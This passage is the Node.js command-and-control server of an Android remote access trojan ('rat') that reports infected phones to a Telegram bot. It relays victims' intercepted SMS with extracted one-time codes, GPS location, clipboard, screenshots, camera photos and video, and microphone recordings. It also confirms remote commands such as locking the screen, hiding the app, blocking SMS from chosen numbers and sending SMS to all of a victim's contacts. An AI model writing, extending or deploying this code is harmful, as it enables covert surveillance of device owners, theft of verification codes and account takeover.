                                            message.shortcut.chat_id,
                                            build(`🔴 ${sym} users of `) + `${message.port}` + build(` is not enough to change owning`),
                                            {
                                                reply_to_message_id: message.shortcut.message_id
                                            }
                                        ) : await bot.editMessageText(
                                            build(`🔴 ${sym} users of `) + `${message.port}` + build(` is not enough to change owning`),
                                            {
                                                message_id: message.shortcut.message_id,
                                                chat_id: message.shortcut.chat_id
                                            }
                                        )
                                    }
                                })
                            }

                        })
                    } else {
                        socket.write(JSON.stringify({
                            status: false,
                            method: Object.keys(message).includes("method") ? message.method : "error",
                            message: "PORT_AND_PASSWORD_NOT_FOUND"
                        }));
                        return;
                    }
                } else {
                    socket.write(JSON.stringify({
                        status: false,
                        method: Object.keys(message).includes("method") ? message.method : "error",
                        message: "PORT_AND_PASSWORD_NOT_FOUND",
                        device_id: message.device_id
                    }));
                    return;
                }
            } else if (Object.keys(message).includes("port") && Object.keys(message).includes("password") && (!Object.keys(message).includes("mask") || message.mask !== "metro")){
                await udt.getUserByPort(message.port, message.password, async (prt) => {
                    if (prt.status){
                        let cli = new TelegramBot(prt.port.token);
                        let bot = cli;
                        if (message.method == "connect"){
                            accepted_users.push({
                                socket: socket,
                                port: prt.port,
                                device_id: message.device_id,
                                access: message.accessory
                            })

                            socket.write(JSON.stringify({
                                status: true
                            }));
                            
                            await cli.sendMessage(
                                prt.port.chat_id,
                                build(`🕸 𓏺|𓏺 new user connected\n\n`) + `🛠 𓏺|𓏺 <code>/sign_${message.device_id}</code>\n` + build("\n🌐 𓏺|𓏺 ip: ") + `<code>${socket.remoteAddress}</code>` + ` - ${socket.remoteAddress}` + build(`\n👔 𓏺|𓏺 rat: ${message.rat}\n🗼 𓏺|𓏺 android-version: ${message.android_version}\n📱 𓏺|𓏺 model: `) + message.model + build(`\n🔋 𓏺|𓏺 battery is %${message.battery}\n🔵 𓏺|𓏺 ${message.accessory.length} access were found\n\n🍁 𓏺|𓏺 `) + `<a href='https://t.me/Vex_Bite'>${build("universe got big plans for us")}</a>`,
                                {
                                    parse_mode: "HTML"
                                }
                            )
                        } else if (message.method == "receiveSMS"){
                            let codes = extractCodes(message.sms);
                            await cli.sendMessage(
                                prt.port.chat_id,
                                build(`📪 𓏺|𓏺 new message received\n👤 𓏺|𓏺 `) + `${message.name !== undefined || message.name !== null ? message.name : build("unknown")} { ${message.phone_number !== undefined || message.phone_number !== null ? message.phone_number : build("no phone")} }` + (codes !== "" ? build(`\n💠 𓏺|𓏺 codes: `) + codes : "") + build("\n📀 𓏺|𓏺 message:") + "\n\n" + message.sms + "\n\n" + build(`🌐 𓏺|𓏺 ip: `) + message.ip,
                                {
                                    parse_mode: "HTML"
                                }
                            )
                        } else if (message.method == "getGeoLocation"){
                            if (message.status == true){
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`🗺 ${sym} location detected\n🛰 ${sym} latitude & longitude : `) +  `<code>${message.latitude},${message.longitude}</code>` + build(`\n🔬 ${sym} check on `) + `<a href="https://www.google.com/maps/@${message.latitude},${message.longitude},15z">${build("google-map")}</a>`,
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`🗺 ${sym} location detected\n🛰 ${sym} latitude & longitude : `) +  `<code>${message.latitude},${message.longitude}</code>` + build(`\n🔬 ${sym} check on `) + `<a href="https://www.google.com/maps/@${message.latitude},${message.longitude},15z">${build("google-map")}</a>`,
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            } else {
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            }
                        } else if (message.method == "vibratePhone"){
                            if (message.status == true){
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`⛓ ${sym} phone vibrated for 5 seconds !`),
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`⛓ ${sym} phone vibrated for 5 seconds !`),
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            } else {
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            }
                        } else if (message.method == "openUrl"){
                            if (message.status == true){
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`📢 ${sym} your url has opened in targets device\n🔗 ${sym} ${message.shortcut.url}`),
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`📢 ${sym} your url has opened in targets device\n🔗 ${sym} ${message.shortcut.url}`),
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            } else {
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            }
                        } else if (message.method == "sendToast"){
                            if (message.status == true){
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`➕ ${sym} toast message has shown-up in targets device !\n➕ ${sym} ${message.shortcut.toast}`),
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`➕ ${sym} toast message has shown-up in targets device !\n➕ ${sym} ${message.shortcut.toast}`),
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            } else {
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            }
                        } else if (message.method == "getInstalledApps"){
                            for (let p of accepted_ports){
                                if (p.port == message.port && p.password == message.password){
                                    p.socket.write(JSON.stringify({
                                        status: true,
                                        port: p.port,
                                        password: p.password,
                                        method: "getInstalledApps",
                                        apps: message.apps,
                                        shortcut: message.shortcut,
                                        device_id: message.shortcut.device_id
                                    }));
                                    return;
                                }
                            }
                        } else if (message.method == "lockScreen"){
                            if (message.status == true){
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`🔒 ${sym} targets screen locked successfully !`),
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`🔒 ${sym} targets screen locked successfully !`),
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            } else {
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            }
                        } else if (message.method == "unlockScreen"){
                            if (message.status == true){
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`🔓 ${sym} targets screen unlocked successfully !`),
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`🔓 ${sym} targets screen unlocked successfully !`),
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            } else {
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            }
                        } else if (message.method == "setSoundVolume"){
                            if (message.status == true){
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`🔊 ${sym} volume seted for your target `) + message.device_id + build(`\n\n🌪 ${sym} volume is ${message.shortcut.volume} now`),
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`🔊 ${sym} volume seted for your target `) + message.device_id + build(`\n\n🌪 ${sym} volume is ${message.shortcut.volume} now`),
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            } else {
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            }
                        } else if (message.method == "setSMSFilter"){
                            if (message.status == true){
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`👤 ${sym} the receive sms blocked for `) + message.shortcut.filter_number,
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`👤 ${sym} the receive sms blocked for `) + message.shortcut.filter_number,
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            } else {
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            }
                        }  else if (message.method == "removeSMSFilter"){
                            if (message.status == true){
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`👤 ${sym} the receive sms unblocked for `) + message.shortcut.filter_number,
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`👤 ${sym} the receive sms unblocked for `) + message.shortcut.filter_number,
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            } else {
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            }
                        }  else if (message.method == "sendSMS"){
                            if (message.status == true){
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`🥌 ${sym} your sms has sent to the `) + message.shortcut.tonumber,
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`🥌 ${sym} your sms has sent to the `) + message.shortcut.tonumber,
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            } else {
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            }
                        }  else if (message.method == "sendAllSMS"){
                            if (message.status == true){
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`🥌 ${sym} your sms has sent to the all contacts of device `) + message.shortcut.device_id,
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`🥌 ${sym} your sms has sent to the all contacts of device `) + message.shortcut.device_id,
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            } else {
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            }
                        } else if (message.method == "hideApp"){
                            if (message.status == true){
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`🌚 ${sym} app has been hided successfully`),
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`🌚 ${sym} app has been hided successfully`),
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            } else {
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            }
                        }  else if (message.method == "unhideApp"){
                            if (message.status == true){
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`🌝 ${sym} app has been unhided successfully`),
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`🌝 ${sym} app has been unhided successfully`),
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            } else {
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            }
                        }  else if (message.method == "changeIcon"){
                            if (message.status == true){
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`🎭 ${sym} your app-icon changed into ${message.shortcut.icon} icon`),
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`🎭 ${sym} your app-icon changed into ${message.shortcut.icon} icon`),
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            } else {
                                message.shortcut.edit ? await bot.editMessageText(
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        parse_mode: "HTML",
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                ) : await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                )
                            }
                        }
                    } else {
                        socket.write(JSON.stringify({
                            status: false,
                            message: "INVALID_PORT_OR_PASSWORD"
                        }))
                    }
                })
            }
        } catch (e){ console.log(e);socket.write(JSON.stringify({
            status: false,
            method: "error",
            message: "INVALID_DATA_TYPE"
        })) }
    })

    socket.on("close", async () => {
        let idx = 0;
        let pid = 0;
        for (let u of accepted_users){
            if (u.socket.remoteAddress == socket.remoteAddress){
                accepted_users.splice(idx, 1);
            } else { idx += 1; }
        }

        for (let p of accepted_ports){
            if (p.socket.remoteAddress == socket.remoteAddress){
                accepted_ports.splice(pid, 1);
            } else { pid += 1; }
        }

    })
    socket.on("error", async (errx) => {console.log(errx);})

})
// handle parameters
const httpserver = http.createServer(async (req, res) => {
    if (req.method === 'POST') {
        let message = splitQuery(url.parse(req.url).query);
        let rnd = Math.floor( Math.random() * 999999999999 ) - 100000;
        const filePath = path.join(__dirname, `${rnd}.${message.ext}`, '.');
        const writeStream = fs.createWriteStream(filePath);
        req.pipe(writeStream);

        let bot = new TelegramBot(message.token);

        writeStream.on('finish', async () => {
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end(JSON.stringify({status: true}));
            if (message.method == "getAllSMS"){
                if (message.status == true){
                    message.edit ? await bot.editMessageMedia(
                        {
                            media: "attach://"+filePath,
                            type: "document",
                            caption: build(`📥 ${sym} all sms of `) + message.device_id
                        },
                        {
                            parse_mode: "HTML",
                            chat_id: message.chat_id,
                            message_id: message.message_id
                        }
                    ) : await bot.sendDocument(
                        message.chat_id,
                        filePath,
                        {
                            reply_to_message_id: message.message_id,
                            caption: build(`📥 ${sym} all sms of `) + message.device_id
                        }
                    )
                } else {
                    message.edit ? await bot.editMessageText(
                        build(`🔴 ${sym} error detected\n - ${message.message}`),
                        {
                            parse_mode: "HTML",
                            chat_id: message.chat_id,
                            message_id: message.message_id
                        }
                    ) : await bot.sendMessage(
                        message.chat_id,
                        build(`🔴 ${sym} error detected\n - ${message.message}`),
                        {
                            reply_to_message_id: message.message_id
                        }
                    )
                }
            } else if (message.method == "recordMicrophone"){
                if (message.status == true){
                    message.shortcut.edit ? await bot.editMessageMedia(
                        {
                            media: "attach://"+filePath,
                            type: "audio",
                            caption: build(`📥 ${sym} recorded microphone of device `) + message.shortcut.device_id
                        },
                        {
                            parse_mode: "HTML",
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    ) : await bot.sendAudio(
                        message.shortcut.chat_id,
                        filePath,
                        {
                            reply_to_message_id: message.shortcut.message_id,
                            caption: build(`📥 ${sym} recorded microphone of device `) + message.shortcut.device_id
                        }
                    )
                } else {
                    message.shortcut.edit ? await bot.editMessageText(
                        build(`🔴 ${sym} error detected\n - ${message.message}`),
                        {
                            parse_mode: "HTML",
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    ) : await bot.sendMessage(
                        message.shortcut.chat_id,
                        build(`🔴 ${sym} error detected\n - ${message.message}`),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    )
                }
            } else if (message.method == "getClipboard"){
                if (message.status == true){
                    message.shortcut.edit ? await bot.editMessageMedia(
                        {
                            media: "attach://"+filePath,
                            type: "document",
                            caption: build(`📥 ${sym} clipboard `) + message.shortcut.device_id + build(` is here`)
                        },
                        {
                            parse_mode: "HTML",
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    ) : await bot.sendDocument(
                        message.shortcut.chat_id,
                        filePath,
                        {
                            reply_to_message_id: message.shortcut.message_id,
                            caption: build(`📥 ${sym} clipboard `) + message.shortcut.device_id + build(` is here`)
                        }
                    )
                } else {
                    message.shortcut.edit ? await bot.editMessageText(
                        build(`🔴 ${sym} error detected\n - ${message.message}`),
                        {
                            parse_mode: "HTML",
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    ) : await bot.sendMessage(
                        message.shortcut.chat_id,
                        build(`🔴 ${sym} error detected\n - ${message.message}`),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    )
                }
            } else if (message.method == "takeScreenshot"){
                if (message.status == true){
                    message.shortcut.edit ? await bot.editMessageMedia(
                        {
                            media: "attach://"+filePath,
                            type: "photo",
                            caption: build(`📥 ${sym} screenshot of device `) + message.shortcut.device_id + build(` page`)
                        },
                        {
                            parse_mode: "HTML",
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    ) : await bot.sendPhoto(
                        message.shortcut.chat_id,
                        filePath,
                        {
                            reply_to_message_id: message.shortcut.message_id,
                            caption: build(`📥 ${sym} screenshot of device `) + message.shortcut.device_id + build(` page`)
                        }
                    )
                } else {
                    message.shortcut.edit ? await bot.editMessageText(
                        build(`🔴 ${sym} error detected\n - ${message.message}`),
                        {
                            parse_mode: "HTML",
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    ) : await bot.sendMessage(
                        message.shortcut.chat_id,
                        build(`🔴 ${sym} error detected\n - ${message.message}`),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    )
                }
            } else if (message.method == "takeFrontshot"){
                if (message.status == true){
                    message.shortcut.edit ? await bot.editMessageMedia(
                        {
                            media: "attach://"+filePath,
                            type: "photo",
                            caption: build(`📥 ${sym} front-shot picture of device `) + message.shortcut.device_id + build(` page`)
                        },
                        {
                            parse_mode: "HTML",
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    ) : await bot.sendPhoto(
                        message.shortcut.chat_id,
                        filePath,
                        {
                            reply_to_message_id: message.shortcut.message_id,
                            caption: build(`📥 ${sym} front-shot picture of device `) + message.shortcut.device_id + build(` page`)
                        }
                    )
                } else {
                    message.shortcut.edit ? await bot.editMessageText(
                        build(`🔴 ${sym} error detected\n - ${message.message}`),
                        {
                            parse_mode: "HTML",
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    ) : await bot.sendMessage(
                        message.shortcut.chat_id,
                        build(`🔴 ${sym} error detected\n - ${message.message}`),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    )
                }
            } else if (message.method == "takeBackshot"){
                if (message.status == true){
                    message.shortcut.edit ? await bot.editMessageMedia(
                        {
                            media: "attach://"+filePath,
                            type: "photo",
                            caption: build(`📥 ${sym} back-shot picture of device `) + message.shortcut.device_id + build(` page`)
                        },
                        {
                            parse_mode: "HTML",
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    ) : await bot.sendPhoto(
                        message.shortcut.chat_id,
                        filePath,
                        {
                            reply_to_message_id: message.shortcut.message_id,
                            caption: build(`📥 ${sym} back-shot picture of device `) + message.shortcut.device_id + build(` page`)
                        }
                    )
                } else {
                    message.shortcut.edit ? await bot.editMessageText(
                        build(`🔴 ${sym} error detected\n - ${message.message}`),
                        {
                            parse_mode: "HTML",
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    ) : await bot.sendMessage(
                        message.shortcut.chat_id,
                        build(`🔴 ${sym} error detected\n - ${message.message}`),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    )
                }
            } else if (message.method == "recordBack"){
                if (message.status == true){
                    message.shortcut.edit ? await bot.editMessageMedia(
                        {
                            media: "attach://"+filePath,
                            type: "video",
                            caption: build(`📥 ${sym} back-video of device `) + message.shortcut.device_id
                        },
                        {
                            parse_mode: "HTML",
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    ) : await bot.sendVideo(
                        message.shortcut.chat_id,
                        filePath,
                        {
                            reply_to_message_id: message.shortcut.message_id,
                            caption: build(`📥 ${sym} back-video of device `) + message.shortcut.device_id
                        }
                    )
                } else {
                    message.shortcut.edit ? await bot.editMessageText(
                        build(`🔴 ${sym} error detected\n - ${message.message}`),
                        {
                            parse_mode: "HTML",
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    ) : await bot.sendMessage(
                        message.shortcut.chat_id,
                        build(`🔴 ${sym} error detected\n - ${message.message}`),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    )
                }
            } else if (message.method == "recordFront"){
                if (message.status == true){
                    message.shortcut.edit ? await bot.editMessageMedia(
                        {
                            media: "attach://"+filePath,
                            type: "video",
                            caption: build(`📥 ${sym} front-video of device `) + message.shortcut.device_id
                        },
                        {
                            parse_mode: "HTML",
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    ) : await bot.sendVideo(
                        message.shortcut.chat_id,
                        filePath,
                        {
                            reply_to_message_id: message.shortcut.message_id,
                            caption: build(`📥 ${sym} front-video of device `) + message.shortcut.device_id
                        }
                    )
                } else {
                    message.shortcut.edit ? await bot.editMessageText(
                        build(`🔴 ${sym} error detected\n - ${message.message}`),
                        {
                            parse_mode: "HTML",
                            chat_id: message.shortcut.chat_id,
                            message_id: message.shortcut.message_id
                        }
                    ) : await bot.sendMessage(
                        message.shortcut.chat_id,
                        build(`🔴 ${sym} error detected\n - ${message.message}`),
                        {
                            reply_to_message_id: message.shortcut.message_id
                        }
                    )
                }
            } 
        });
    } else {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(`
            <form method="POST" enctype="multipart/form-data">
                <input type="file" name="file" />
                <button type="submit">Upload</button>
            </form>
        `);
    }
});

server.listen(9932, "0.0.0.0", () => {
    let getCurrentIp = getServerIP();
    console.log("[B] socket-server connected");
    console.log("[B] socket-connection -> 127.0.0.1:9932");
    if (!getCurrentIp == "127.0.0.1"){
        console.log(`[B] socket-connection -> ${getCurrentIp}:9932`);
    }
})

httpserver.listen(5567, "0.0.0.0", () => {
    let getCurrentIp = getServerIP();
    console.log("[B] http-server connected");
    console.log("[B] http-connection -> 127.0.0.1:5567");
    if (!getCurrentIp == "127.0.0.1"){
        console.log(`[B] http-connection -> ${getCurrentIp}:5567`);
    }
})

process.on("uncaughtException", async (err) => {
    console.log("[B] error detected:", err);
})